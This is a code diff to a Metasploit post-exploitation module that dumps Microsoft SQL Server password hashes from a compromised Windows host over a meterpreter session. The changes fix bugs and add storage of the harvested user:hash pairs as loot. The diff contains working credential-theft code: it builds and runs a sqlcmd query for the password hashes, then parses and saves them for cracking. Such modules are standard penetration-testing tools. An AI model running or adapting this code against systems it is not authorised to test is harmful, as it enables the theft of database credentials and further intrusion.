@@ -5,19 +5,28 @@
 
 require 'msf/core'
 require 'rex'
+require 'msf/core/auxiliary/report'
+require 'rex/proto/rfb'
 
 
 class Metasploit3 < Msf::Post
+  include Msf::Auxiliary::Report
+  include Msf::Post::Windows::UserProfiles
+
+  VERSION_5 = Gem::Version.new('5.0')
+  VERSION_6 = Gem::Version.new('6.0')
+  VERSION_8 = Gem::Version.new('8.0')
+  VERSION_9 = Gem::Version.new('9.0')
 
   def initialize(info={})
     super( update_info( info,
         'Name'          => 'Windows Local SQL Server Password Hashes Dump',
         'Description'   => %q{ This module extracts the usernames and password
-        hashes from a MSSQL server and stores them for later cracking using the
+        hashes from a MSSQL server and stores them in the loot using the
         same technique in mssql_local_auth_bypass (Credits: Scott Sutherland)
         },
         'License'       => MSF_LICENSE,
-        'Author'        => [ 'Mike Manzotti <michelemanzotti[at]gmail.com>'],
+        'Author'        => [ 'Mike Manzotti <mike.manzotti[at]dionach.com>'],
         'Platform'      => [ 'win' ],
         'SessionTypes'  => [ 'meterpreter' ]
       ))
@@ -55,7 +64,7 @@ class Metasploit3 < Msf::Post
           add_sql_status = get_sql_hash(sql_client,instance,service_instance,verbose)
 
           # If Fail
-          if add_sql_status.empty?
+          if add_sql_status == 0
 
             # Attempt to impersonate sql server service account (for sql server 2012)
             impersonate_status = impersonate_sql_user(service_instance,verbose)
@@ -231,16 +240,16 @@ class Metasploit3 < Msf::Post
       # Check default instance name
       if service_instance == "MSSQLSERVER" then
         print_status(" o MSSQL Service instance: #{service_instance}") if verbose == "true"
-        sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 100"
+        sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 200"
       else
       # User defined instance
       print_status(" o  OTHER Service instance: #{service_instance}") if verbose == "true"
-      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 100"
+      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 200"
       end
     else
       # User defined instance
       print_status(" o defined instance: #{instance}") if verbose == "true"
-      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 100"
+      sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"SET nocount on;#{mssql_password_hashes_query}\" -h-1 -w 200"
     end
 
     # Display debugging information
@@ -249,16 +258,18 @@ class Metasploit3 < Msf::Post
 
     # Get Data
     get_hash_result = run_cmd("#{sqlcommand}")
+    #print_good("Raw Result: \n#{get_hash_result}")
 
+    
     # Parse Data
     get_hash_array = get_hash_result.split("\n").grep(/:/)
 
     # Save data
+    loot_hashes = ""
     get_hash_array.each do |row|
       user = row.strip.split(":")[0]
       hash = row.strip.split(":")[1]
 
-      # Taken from auxiliary/scanner/mssql/mssql_hashdump.rb
       service_data = {
       address: ::Rex::Socket.getaddress(rhost,true),
       port: rport,
@@ -269,14 +280,14 @@ class Metasploit3 < Msf::Post
 
       # Initialize Metasploit::Credential::Core object
       credential_data = {
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         origin_type: :session,
         private_type: :nonreplayable_hash,
         private_data: hash,
         username: user,
         session_id: session_db_id,
         jtr_format: hashtype,
-        orkspace_id: myworkspace_id
+        workspace_id: myworkspace_id
       }
 
       credential_data.merge!(service_data)
@@ -295,6 +306,17 @@ class Metasploit3 < Msf::Post
       login = create_credential_login(login_data)
 
       print_good("#{rhost} Saving = #{user}:#{hash}")
+
+      loot_hashes << user+":"+hash+"\n"
+ 
+    end
+    if loot_hashes != "" 
+        # Store MSSQL password hash as loot
+        loot_path = store_loot('mssql.hash', 'text/plain', session, loot_hashes, 'mssql_hashdump.txt', 'MSSQL Password Hash')
+        print_good("MSSQL password hash saved in: #{loot_path}")
+        return 1
+    else
+        return 0
     end
   end
 
